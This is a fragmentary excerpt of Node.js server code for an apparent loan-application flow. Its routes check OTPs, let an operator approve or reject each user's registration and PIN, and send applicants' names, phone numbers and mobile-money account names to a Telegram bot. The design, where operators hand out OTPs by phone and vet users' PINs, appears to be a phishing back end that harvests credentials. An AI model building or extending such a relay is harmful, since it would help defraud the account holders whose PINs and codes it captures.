...
console.log('   Rate limit: 5 minutes');
console.log('═══════════════════════════════════════');
...
// ═══════════════════════════════════════════════════════════
// REGISTRATION (initial submit — awaits admin)
// ═══════════════════════════════════════════════════════════
...
app.post('/api/registration/verify-otp', otpLimiter, async (req, res) => {
    try {
        ...
        // ─── Attempts exhausted → reset to registration start ───
        if ((app_.regOtpAttempts || 0) >= MAX_OTP_ATTEMPTS) {
            ...
            saveApps();
            tgSend(`❌ <b>OTP LOCKED OUT</b>\n🆔 ${code(applicationId)}\nToo many attempts — registration reset.`);
        ...
        if (app_.regOtp !== String(otp).trim()) {
            ...
            if (remaining <= 0) {
                ...
                app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_otp_attempts' });
                saveApps();
                tgSend(`❌ <b>OTP LOCKED OUT</b>\n🆔 ${code(applicationId)}\nMax attempts reached — registration reset.`);
                return res.status(400).json({ ok: false, error: 'Too many incorrect attempts. Please re-register.' });
            }
...
// Reset registration to allow restart (called by frontend "Register Again")
...
// ═══════════════════════════════════════════════════════════
// UNIFIED STEP SUBMISSION (loan flow)
// ═══════════════════════════════════════════════════════════
    ...
    try {
            ...
            try {
                ...
                if (step === 'registration') {
                    if (approved) {
                        ...
                        tgSend(
                            ...
                            `📌 Deliver via SMS or call.\n` +
                            `⚠️ ${MAX_OTP_ATTEMPTS} attempts max — user returns to registration start if exceeded.`
                        );
                    } else {
                        // ✅ Rejection → full restart
                        app_.registrationStatus = REG_STATUS.REJECTED;
                        ...
                        tgSend(
                            ...
                            `🆔 ${code(data.id)}\n` +
                            `👤 ${esc(app_.fullName || '')}\n\n` +
                            `User will be sent back to the registration page.`
                        );
                    }
                    return;
                }
                ...
                if (step === 'reg_pin') {
                    if (approved) {
                        ...
                        // ✅ PIN rejected → user re-enters PIN only (phone already verified)
                        app_.registrationStatus = REG_STATUS.OTP_VERIFIED;
                        app_.regPin = null;
                        ...
                        tgSend(
                            `❌ <b>PIN REJECTED</b>\n` +
                            `🆔 ${code(data.id)}\n` +
                            `User returned to PIN entry (phone already verified).`
                        );
                    }
                    return;
                }
        ...
        if (req.body && req.body.message && req.body.message.text) {
            ...
            if (text === '/start' || text === '/help') {
                ...
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Not found'); return; }
                const stepStatus = a.steps ? STEP_ORDER.map(k => `${k}:${a.steps[k]}`).join(' ') : 'N/A';
                tgSend(
                    `🔍 <b>DETAILS — ${code(realKey)}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n` +
                    `👤 ${esc(a.fullName || '')}\n📱 ${a.phone ? code('+27' + a.phone) : 'N/A'}\n` +
                    `💳 ${esc(a.momoRegistration?.accountName || 'N/A')}\n` +
